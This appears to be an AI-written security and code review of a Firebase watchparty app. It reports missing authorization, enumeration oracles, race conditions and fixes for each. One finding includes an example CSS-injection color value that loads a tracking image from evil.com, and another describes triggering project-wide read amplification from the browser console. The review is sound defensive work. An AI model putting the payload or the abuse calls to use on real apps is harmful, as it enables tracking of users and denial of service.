---
phase: 30-couch-groups-affiliate-hooks
reviewed: 2026-05-03T23:30:00Z
depth: deep
files_reviewed: 6
files_reviewed_list:
  - js/app.js
  - js/firebase.js
  - firestore.rules
  - app.html
  - C:\Users\nahde\queuenight\functions\src\addFamilyToWp.js
  - C:\Users\nahde\queuenight\functions\src\wpMigrate.js
  - C:\Users\nahde\queuenight\functions\src\rsvpSubmit.js
findings:
  blocker: 0
  high: 4
  medium: 4
  low: 2
  info: 1
  total: 11
status: issues_found
---

# Phase 30: Code Review Report

**Reviewed:** 2026-05-03T23:30:00Z
**Depth:** deep (cross-file, cross-repo)
**Files Reviewed:** 6 source files (couch + queuenight CFs)
**Status:** issues_found

## Summary

Phase 30 ships a substantial cross-family architecture with strong mitigations already documented in `30-SECURITY.md` (20 STRIDE threats, including the post-deploy `crossFamilyMembers` denylist remediation at `firestore.rules:162`). The code-level review surfaces **11 findings** that the smoke contract and security audit did not catch — primarily around:

1. **Functional bug** — the wp-create modal "Bring them in" affordance is wired but cannot succeed at wp-create time because the wp doc does not yet exist (`wp.id === null`). Users will see a confusing generic error toast.
2. **Authorization gap on `wpMigrate`** — the migration callable is gated only by `request.auth` (any signed-in user), enabling DoS-amplification reads and an overwrite race against fresh wp docs.
3. **Confidentiality leak** — the `failed-precondition` "no members yet" toast distinguishes "real family with no authed members" from "nonexistent family", undermining the deliberate `not-found` enumeration mitigation at `addFamilyToWp.js:35,41`.
4. **Bootstrap race** — wp-create stamps `memberUids` from `state.members` which may be empty at cold start, blocking creation against the `request.auth.uid in resource.data.memberUids` rule.

None of these are BLOCKERs for human UAT — but Findings 1 and 2 should be patched before broad rollout. The remaining findings are pre-UAT polish.

## High

### HIGH-1: wp-create modal "Bring them in" button is functionally broken

**File:** `js/app.js:10308-10316` + `js/app.js:11430` + `js/app.js:11461`

**Issue:** When `openWatchpartyStart` opens the wp-create modal (line 10303), it calls `renderAddFamilySection(wp)` with a synthetic wp shape containing `id: null` (line 10310). The user can paste a family code, click "Bring them in", and `onClickAddFamily` invokes `httpsCallable(functions, 'addFamilyToWp')({ wpId: wp.id, familyCode })` with `wpId = null`. The CF rejects via `looksLikeWpId(null) === false → throw HttpsError('invalid-argument', 'Invalid watchparty.')`. The client error matrix at `js/app.js:11447-11461` does NOT include a case for `functions/invalid-argument`, so the user sees the generic fallback toast: `Couldn't add that couch (Invalid watchparty.).` — a confusing UX that suggests something is wrong with the FAMILY CODE rather than the workflow.

This contradicts the implicit promise of the wp-create modal flow ("title → schedule → members → bring another couch (optional) → Start" per `30-04-PLAN.md:128`). There is no buffering of pending family codes for stamping at `confirmStartWatchparty` time (verified at `js/app.js:11192-11243` — no read of input value, no add to families/memberUids). Smoke sentinels do not exercise the actual click handler.

**Reproduction:** Open Tonight tab → tap a title → "Start watchparty" → paste any 4-32 char family code in the "Bring them in" input → click submit. Toast reads `Couldn't add that couch (Invalid watchparty.).` regardless of whether the code is valid.

**Fix:** Two viable approaches:

```javascript
// Option A (minimal): hide the input row in the wp-create modal entirely; only show the
// "Bring another couch in" affordance in the lobby (post-creation). Add a guard at the
// top of renderAddFamilySection:
function renderAddFamilySection(wp, idSuffix) {
  const suffix = idSuffix || '';
  const section = document.getElementById('wp-add-family-section' + suffix);
  if (!section) return;
  // NEW: at wp-create time the wp has no id yet — show a deferred-message variant.
  if (!wp || !wp.id) {
    const inputRow = document.getElementById('wp-add-family-input-row' + suffix);
    if (inputRow) inputRow.style.display = 'none';
    const subline = document.getElementById('wp-add-family-subline' + suffix);
    if (subline) subline.innerHTML = "<em>You can pull up another family right after starting the watchparty.</em>";
    return;
  }
  // ... existing logic
}

// Option B (richer UX): buffer pending family codes in module state, then on
// confirmStartWatchparty, after setDoc resolves, iterate the pending list and call
// addFamilyToWp once per code. Each call's success/failure surfaces as its own toast.
```

Option A is a 15-line patch; Option B requires touching `confirmStartWatchparty`, `confirmGamePicker`, and `scheduleSportsWatchparty`.

---

### HIGH-2: `wpMigrate` is callable by any signed-in user — DoS amplification + overwrite race

**File:** `C:\Users\nahde\queuenight\functions\src\wpMigrate.js:18-21`

**Issue:** The callable's only auth gate is `if (!request.auth) throw new HttpsError('unauthenticated', ...)`. There is no admin-uid allowlist, no Firebase custom claim check, no env-var-gated guard. Any signed-in Couch user can invoke `wpMigrate`, which:

1. Reads ALL watchparty docs project-wide via `db.collectionGroup('watchparties').get()` (line 21) — O(N families × M wps) read amplification. Free Firebase tier exhausts at ~50K reads/day; a malicious actor can trigger 10× the daily quota with one call.
2. For each legacy nested doc, performs a member-roster read (line 44) — additional read amplification.
3. Uses `bulkWriter.set(ref, Object.assign(...))` (line 50) — **no `merge: true`** flag. This OVERWRITES the entire top-level doc with legacy nested data + Phase 30 stamps if the idempotency guard at line 39 fails (`memberUids` missing or empty). A fresh Phase 30 wp created seconds before the migration call would be silently corrupted: any field the new wp has that the legacy nested twin lacks (e.g., reactions added in the last minute) is wiped.

The accepted risk `R-30-04` in `30-SECURITY.md:72` only addresses information disclosure, not authorization-level abuse. The "runs as the calling admin's signed-in client" framing is incorrect — the CF runs with admin SDK regardless of the caller's role.

**Reproduction:**
- DoS: any test family account → DevTools console → `firebase.functions().httpsCallable('wpMigrate')()` → triggers project-wide read.
- Overwrite race: User A creates wp at 10:00:00 (top-level doc with `memberUids: ['uidA']`, fresh `reactions: [...]`). At 10:00:00.500, user B calls `wpMigrate`. The legacy nested twin still exists from migration window. wpMigrate's idempotency check at line 39 sees `memberUids.length > 0` → SKIPS — actually safe in this case. But: if User A's family had 0 authed members at create time, `memberUids: []` → the guard fails → bulkWriter.set OVERWRITES the fresh wp with stale legacy data.

**Fix:** Two layers:

```javascript
// 1. Tighten authorization: gate on a hardcoded admin uid list or env var.
const ADMIN_UIDS = (process.env.ADMIN_UIDS || '').split(',').filter(Boolean);
exports.wpMigrate = onCall({...}, async (request) => {
  if (!request.auth) throw new HttpsError('unauthenticated', 'Sign in required.');
  if (!ADMIN_UIDS.includes(request.auth.uid)) {
    throw new HttpsError('permission-denied', 'Admin only.');
  }
  // ... rest
});

// 2. Use merge to avoid clobbering concurrent writes:
bulkWriter.set(db.doc('watchparties/' + wpId), Object.assign({}, wpData, {
  hostFamilyCode: familyCode,
  families: [familyCode],
  memberUids: memberUids,
  crossFamilyMembers: wpData.crossFamilyMembers || [],
}), { merge: true });
```

The merge option is critical — it preserves any fields the fresh top-level doc has that the legacy nested twin lacks.

---

### HIGH-3: `wpMigrate` can produce permanently-unreadable wps when family has 0 authed members

**File:** `C:\Users\nahde\queuenight\functions\src\wpMigrate.js:43-55`

**Issue:** When wpMigrate processes a legacy nested wp, it stamps `memberUids` from the family's CURRENT member roster (line 45-47) — filtering for docs with a string `uid` field. Pre-Phase-5 families and families that have only sub-profiles (managedBy, no uid) would produce `memberUids: []`. The migrated top-level doc then becomes UNREADABLE TO ALL USERS via `firestore.rules:142` (`request.auth.uid in resource.data.memberUids` — empty array contains no uid).

The host of that wp can no longer open it; the wp is effectively orphaned until the 25h archive (and even then, the doc remains in Firestore and continues to count toward queries). Unlike the addFamilyToWp's W4 zero-member guard at `addFamilyToWp.js:75-77` that throws `failed-precondition`, wpMigrate has NO guard — it silently produces the unreadable doc.

**Reproduction:** Pre-Phase-5 family had a watchparty pre-Phase-30 (nested at `families/{code}/watchparties/{id}`). All members are sub-profiles or grace-window unauthed. Run `wpMigrate`. The new top-level doc has `memberUids: []`. The host opens Tonight tab — the wp does NOT appear. Direct doc read returns "Missing or insufficient permissions."

**Fix:**

```javascript
const memberUids = membersSnap.docs
  .map(m => m.data().uid)
  .filter(u => u && typeof u === 'string');

// NEW: skip migration of wps where no member can read the migrated doc.
// Better to leave the legacy nested doc intact than to produce an orphan.
if (memberUids.length === 0) {
  invalid++; // or add a separate `skippedNoMembers` counter
  continue;
}
```

Same guard pattern as addFamilyToWp.js:75-77.

---

### HIGH-4: `failed-precondition` toast leaks family-code existence (defeats `not-found` mitigation)

**File:** `C:\Users\nahde\queuenight\functions\src\addFamilyToWp.js:75-77` + `js/app.js:11453-11457`

**Issue:** P02-T-30-03 in the security register mandates a "neutral error for malformed vs nonexistent code" via the shared `'No family with that code.'` message at `addFamilyToWp.js:35,41`. But the W4 zero-member guard at line 75 throws `failed-precondition` with message `'That family has no members yet.'`, which the client renders as `"That family hasn't added any members yet — ask them to invite people first."` (js/app.js:11457). This response is ONLY reachable when the family doc exists — converting the CF into a family-code existence oracle:

- `not-found` → family code is malformed OR does not exist
- `failed-precondition` → family code IS valid AND family exists, but has no authed members

A malicious actor who is host of any wp can paste random codes in their own wp's "Bring them in" input and use the toast text as a binary signal: "valid family code with no authed members" vs "invalid/nonexistent". For a 4-char alphanumeric code space (~14M codes for `[A-Za-z0-9_-]{4}`), this reduces the search space and identifies the rare "real but empty" families.

The threat is partial — the attacker still cannot enumerate families that DO have authed members (those return `ok: true` and the family is added to the attacker's wp, which is detectable by the family). But "empty families" (newly-created, sub-profile-only) are silently fingerprintable.

**Fix:**

```javascript
// addFamilyToWp.js — collapse failed-precondition into the same neutral not-found.
if (newUids.length === 0) {
  // Same neutral message as malformed/nonexistent; add internal log for legitimate ops debugging.
  console.warn('[addFamilyToWp] family exists but has zero authed members', { familyCode, callerUid: request.auth.uid });
  throw new HttpsError('not-found', 'No family with that code.');
}
```

Trade-off: the legit user who genuinely tried to add an empty family loses the brand-voice "ask them to invite people first" toast. But they would learn the same outcome via "double-check spelling" + retry. The confidentiality win is worth the UX loss for v1.

If the warm toast is non-negotiable, throttle the failed-precondition response (e.g., 5/min per caller) and log the rate to detect enumeration.

## Medium

### MEDIUM-1: wp-create races a cold-start `state.members` and produces empty `memberUids`

**File:** `js/app.js:10556`, `js/app.js:10755`, `js/app.js:11241`

**Issue:** All three wp-create paths stamp `memberUids: (state.members || []).map(m => m && m.uid).filter(Boolean)`. If `state.members` has not loaded by the time the user clicks the create button (e.g., cold-start, slow network, anonymous-then-claim flow), this evaluates to `[]`. The wp-create rule at `firestore.rules:146` requires `request.auth.uid in request.resource.data.memberUids` — empty array fails, the create is denied, the user gets a `Could not schedule: missing or insufficient permissions` toast (line 10576).

The likelihood is low in practice (the wp-create modal is several taps deep, state.members usually loads by then), but a fast PWA cold-start to "Tonight tab → start watchparty" path could trip it on a slow connection or Firestore replica delay.

**Fix:**

```javascript
// At all three wp-create sites, ensure the host's auth.uid is included even if
// state.members hasn't populated yet:
memberUids: Array.from(new Set([
  ...(state.members || []).map(m => m && m.uid).filter(Boolean),
  state.auth && state.auth.uid,  // host's uid (always known at this point — confirmStartWatchparty already gates on state.me)
].filter(Boolean))),
```

This guarantees the host's uid is in memberUids, satisfying the create rule even if state.members is empty.

---

### MEDIUM-2: `wpMigrate` overwrites concurrent writes (no `merge: true`)

**File:** `C:\Users\nahde\queuenight\functions\src\wpMigrate.js:50`

**Issue:** `bulkWriter.set(db.doc(...), Object.assign({}, wpData, {...}))` defaults to overwrite (no merge). The idempotency guard at line 39 only protects docs WHERE `memberUids` already exists with length > 0. During the live deploy window when both legacy nested AND fresh top-level docs coexist:
- A Phase 30 client creates a wp at top-level with `memberUids: ['hostUid']`.
- An admin runs wpMigrate concurrently. The check sees length > 0 → skip. SAFE.
- BUT: a Phase 30 client whose family has only sub-profiles creates a wp with `memberUids: []`. wpMigrate overwrites with stale legacy nested data (which may not even exist for fresh wps — but the wpMigrate iteration is sourced from `collectionGroup` on legacy nested docs, so this specific case is bounded).

The realistic concern is during the migration cutover when both paths are active: a host editing their wp (host-only currentTime updates, reaction additions, video URL changes) at the moment wpMigrate runs would have those updates wiped if the top-level memberUids guard is bypassed.

**Fix:** See HIGH-2 fix — pass `{ merge: true }` to bulkWriter.set.

Lower than HIGH because the migration is one-shot (post-deploy), not recurring, and the live-write race window is tiny.

---

### MEDIUM-3: Auto-archive write at line 4912 fires from any member, not just host

**File:** `js/app.js:4910-4913`

**Issue:** When the watchparties subscription fires, every client iterates `state.watchparties` and tries to flip stale wps to `status: 'archived'` via `updateDoc(watchpartyRef(wp.id), { ...writeAttribution(), status: 'archived' })`. The Phase 30 top-level rules permit this because `status` is NOT in the Path B denylist (`firestore.rules:158-163`) — any member in `memberUids` can write status.

Behavioral implication: under N concurrently-online clients in a wp, all N race to fire the archive write. Firestore write fees stack, and `lastActivityAt` ticks on every winner. Worse: the archive write blows away any field the writer doesn't include — but `updateDoc` is field-level (not setDoc), so it only writes `status`, `actingUid`, `memberId`, `memberName`. SAFE on the data side.

The DoS-write angle is minor (one write per stale wp per snapshot per client — bounded by number of stale wps). No security gap, just write-amplification. The try/catch swallow at the end of line 4912 also masks any rule denial.

**Fix:** Gate the archive write on `wp.hostId === state.me.id` so only the host's client fires it:

```javascript
state.watchparties.forEach(wp => {
  if (wp.status !== 'archived' && wp.status !== 'cancelled' && (now - wp.startAt) >= WP_ARCHIVE_MS) {
    if (!state.auth || !(state.me && state.me.id)) return;
    // NEW: only the host fires the archive write — other clients passively observe.
    if (wp.hostId !== state.me.id) return;
    try { updateDoc(watchpartyRef(wp.id), { ...writeAttribution(), status: 'archived' }); } catch(e){}
  }
});
```

Existing behavior, not Phase-30-introduced — but Phase 30 widens the denylist surface (top-level wps now have many more readers per wp), amplifying this pattern. Worth tightening as part of Phase 30 cleanup.

---

### MEDIUM-4: `onClickAddFamily` error matrix missing `functions/invalid-argument`

**File:** `js/app.js:11447-11461`

**Issue:** The CF throws `invalid-argument` for malformed `wpId` (line 32) and for the synthetic null-id case (HIGH-1). The client error matrix lacks an explicit case, so users hit `Couldn't add that couch (Invalid watchparty.).` — confusing because the error message refers to "watchparty" but the user pasted a "family code". Also no case for unhandled CF errors like `functions/internal` (admin-SDK transient failures, network blips).

**Fix:**

```javascript
} else if (code === 'functions/invalid-argument') {
  flashToast('Something looks off with that family code. Try again with the actual code your friend shared.', { kind: 'warn' });
} else if (code === 'functions/internal') {
  flashToast('Couldn\'t reach the server. Try again in a moment.', { kind: 'warn' });
} else {
  flashToast(`Couldn't add that couch (${msg || 'unknown error'}).`, { kind: 'warn' });
}
```

## Low

### LOW-1: `crossFamilyMembers` chip render injects `m.color` into `style` attribute via escapeHtml (CSS injection, not XSS)

**File:** `js/app.js:12688-12689`

**Issue:** The cross-family chip render does:
```javascript
const color = m.color || '#888';
return `<div class="wp-participant-chip cross-family"...>
  <div class="wp-participant-av" style="background:${escapeHtml(color)};" ...>
```

`m.color` is stamped by `addFamilyToWp.js:88` from the foreign family's member doc (`dd.color`). `escapeHtml` escapes `<`, `>`, `&`, `"`, `'` — sufficient for HTML-attribute context, BUT the `style` attribute interprets CSS, not HTML. A malicious foreign family with `color: 'red;background-image:url(https://evil.com/track.png?uid='` would inject a tracking pixel that leaks the wp viewer's IP to evil.com — a confidentiality leak (visit fingerprinting), not RCE.

The double-quote in the malicious color would be escaped to `&quot;` and break the attribute, but unquoted CSS injection (no quotes in payload) is viable. Modern browsers (Chrome/Safari/FF) do NOT execute JS via CSS in style attributes (no `expression()` legacy), so this is bounded to a CSS-defacement / tracking-pixel surface.

This is also not Phase-30-unique — the existing `wp-participant-av` chip rendering uses the same pattern at line 12626 (`style="${avStyle}"` with teamColor escapeHtml).

**Fix:** Validate color server-side in addFamilyToWp.js — accept only `#xxxxxx` hex or known palette names:

```javascript
function isValidColor(c) {
  return typeof c === 'string' && /^#[0-9A-Fa-f]{3,8}$/.test(c);
}
const crossFamilyRows = membersSnap.docs.map(d => {
  const dd = d.data();
  return {
    // ... existing fields
    color: isValidColor(dd.color) ? dd.color : '#888',
  };
});
```

Lower priority because: (a) attacker must control the foreign family's member docs, (b) impact is tracking pixel (not RCE), (c) pattern pre-exists Phase 30. Worth fixing during Phase 30 cleanup since it's the only render path that pulls colors from a cross-family trust boundary.

---

### LOW-2: `addFamilyToWp.js` race between `wpDoc` read and `update` write — duplicate add via concurrent host calls

**File:** `C:\Users\nahde\queuenight\functions\src\addFamilyToWp.js:45-100`

**Issue:** The CF reads the wp doc (line 45), checks the hard cap (line 59), and writes via `arrayUnion` (line 95-100) — but with NO transaction or precondition. Two simultaneous host-initiated adds can both pass the cap-7→8 check and both proceed to write, producing 9 families in `wp.families[]`.

Specifically: at `currentFamilies.length === 7`, two concurrent calls race:
- Call A reads → sees 7 → check passes → writes arrayUnion(familyA_code) → 8 families.
- Call B reads (simultaneously, before A's write commits) → sees 7 → check passes → writes arrayUnion(familyB_code) → 8 families (since arrayUnion deduplicates IF familyB_code wasn't already there, which it isn't on the read snapshot but IS on the post-A-write snapshot if same code).

Actual outcome:
- If A and B add DIFFERENT family codes → wp ends with 9 families (cap violated by 1).
- If A and B add the SAME family code → arrayUnion deduplicates familyA_code+familyA_code = 1 entry → wp ends with 8 families. Idempotency at line 53 also catches this on re-run. SAFE.

The "different family codes" case is realistic: the host has 2 devices open and pastes two codes simultaneously.

**Fix:** Wrap the read-check-write in a Firestore transaction:

```javascript
await db.runTransaction(async (tx) => {
  const wpSnap = await tx.get(db.doc('watchparties/' + wpId));
  if (!wpSnap.exists || wpSnap.data().hostUid !== request.auth.uid) {
    throw new HttpsError('permission-denied', 'Host only.');
  }
  const wp = wpSnap.data();
  const currentFamilies = Array.isArray(wp.families) ? wp.families : [];
  if (currentFamilies.includes(familyCode)) return; // idempotent
  if (currentFamilies.length >= 8) throw new HttpsError('resource-exhausted', 'No more room on this couch tonight.');
  // ... member roster read happens BEFORE transaction (non-transactional reads of foreign family) ...
  tx.update(wpSnap.ref, { /* arrayUnion stamps */ });
});
```

Lower priority because: (a) host having 2 devices and racing is rare, (b) the worst-case overflow is 9 families (one over cap) which doesn't blow the 1MB doc limit, (c) the soft-cap warning at 5+ already nudges the host away from this regime.

## Info

### INFO-1: Stale legacy nested wp docs continue to live in Firestore post-migration

**File:** `firestore.rules:138-140` (comment), `wpMigrate.js` (no delete)

**Issue:** Per the inline comment at `firestore.rules:138-140`, the legacy nested `/families/{familyCode}/watchparties/{wpId}` rule block is intentionally retained "during the cache-bust window." After `wpMigrate` copies a nested doc to top-level, the nested copy is NOT deleted — it remains in Firestore indefinitely. Future writes go to top-level only, so the nested copy diverges (becomes stale) but remains readable to family members via the existing `isMemberOfFamily(familyCode)` rule at line 627.

Practical impact:
- Storage cost grows linearly with pre-Phase-30 wp count.
- Any future feature that does a per-family scan of wps could see stale data.
- A "follow-up to add `allow read: if false` to the nested block" is mentioned in the comment but not scheduled.

This is informational — not a bug per se, just a planned cleanup task that should be tracked. Phase 30.x or a maintenance phase should:

1. Wait until installed PWA cache-bust window confirms (couch-v40 retired from active use).
2. Run wpMigrate one final time to ensure all nested docs have top-level twins.
3. Add `allow read: if false` to the nested rule block.
4. Optionally schedule a CF that hard-deletes nested docs older than 25h × 2 (covers any lingering active wps).

No fix required for Phase 30 — flag as INFO so the cleanup isn't forgotten when triaging Phase 31+.

---

_Reviewed: 2026-05-03T23:30:00Z_
_Reviewer: Claude (gsd-code-reviewer) — Opus 4.7 (1M context)_
_Depth: deep_
_Confidence threshold: >80% — findings below confidence (e.g., theoretical CSS injection RCE) excluded._
